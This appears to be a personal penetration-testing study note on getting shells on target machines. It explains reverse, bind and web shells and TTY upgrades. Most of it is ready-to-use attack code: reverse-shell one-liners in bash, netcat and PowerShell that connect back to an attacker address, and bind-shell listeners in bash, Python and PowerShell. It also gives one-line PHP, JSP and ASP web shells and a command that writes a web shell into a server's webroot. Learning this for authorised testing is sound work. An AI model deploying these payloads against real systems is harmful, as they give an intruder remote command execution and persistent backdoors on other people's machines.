# Shellings

Means getting a active bash session on the target machine, which allows to execute CLI commands. Usually done exploiting an RCE vulnerability.

There are different types of shelling.

| Type of shelling | Method of communicaton |
| - | - |
| Reverse shell | Target machine connects to us and gives us control to run any command |
| Bind | shell | We open a connection on a target machine |
| Web shell | It's when server accepts commands through HTTP parameters |

## Reverse shell

To launch a netcat listener server on our machine:

`nc -lvnp 1234`
-  `-l` means to open server on listen mode
- `-v` verbose mode, which means output is given on any action (connect, disconnect, etc.)
- `-n` Disables DNS resolution which reduces latency as we connect from IP to IP
- `-p 1234` port number netcat is listening on
When we have this server open, we can make the target connect to it through RCE. Though the connection is fragile as session can be interrupted by connection loss or someone ctrl+c'ing.

```
you can find your IP on linux with ip a or on windows with ipconfig. It's needed for when reverse shelling on target
```

What to execute on target machine depends on OS

[Reverse shell commands for different bashes and languages](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

These are reliable commands that can be run on target for reliable reverse shell:
``` bash
bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
```

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
```

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
```

And when we receive a message on our listener server we are in.

## Bind shell

[Bind shell payload cheat sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Bind%20Shell%20Cheatsheet.md#ncat)


Bind shell is when you manage to create a listener server on target and you connect to it.

Reliable commands for opening a listener server on the target. 

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
```
```python
python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
```
```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();
```
to connect to a listener server with netcat we can run a command:
`nc ip 1234`

It's better because we can now interrupt shell from our side, and we decide to connect back we can do that by just nc'ing.

## Upgrading TTY

Netcat sucks. You can move text cursor, nor you can access command history with up and down. 

But we can do that, we need to upgrade our connection to TTY. We can map our terminal TTY to remote TTY.

### TTY upgrade with `python/stty`

On our machine we run 
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```
After the command - `ctrl+z` to background our shell 
then we run:
```bash
stty raw -echo
fg
```
After `fg` it will bring our `netcat` to foreground. The terminal will show blank line. We can hit enter again to get back to our shell or input reset and hit enter to bring it back.

It's possible to change `stty` window side.
We get variables
```bash
echo $TERM
stty size
```
now we can set them
```bash
export TERMP=xterm-256color
stty rows 67 columns 318
```

## Web Shell

Web shell is usually an injected PHP or ASPX script that accepts our commands through HTTP request parameters such as `GET` or `POST` executes the command and print its output back.

Short web shell scripts
```php
<?php system($_REQUEST["cmd"]); ?>
```
```jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```
```asp
<% eval request("cmd") %>
```

Once we can execute commands we need to place our shell script into remote host web directory. This cn be done through a vulnerability in an upload feature.

Default webroots for common webservers

| Web server | Default Webroot |
| - | - | 
| Apache | `/var/www/html/` |
| Nginx | `/usr/local/nginx/html` |
| IIS | `c:\inetpub\wwwroot` |
| XAMPP | `C:\xampp\htdocs` |

If we knew the directory we could write our `.php` (or any script) file.
```bash
echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php
```

Now to access our web shell we would just cURL into the website using `shell.php` with paramter `?cmd=` which value would be the command we would like to execute

Web shell benefits:
- Bypasses firewalls as the server itself is issuing the commands through the OS which was exploited by using a web site 
- Even if the compromised host is rebooted the exploit file is still there
Disadvantage of web shell are is that it's not as interactive as the other shells.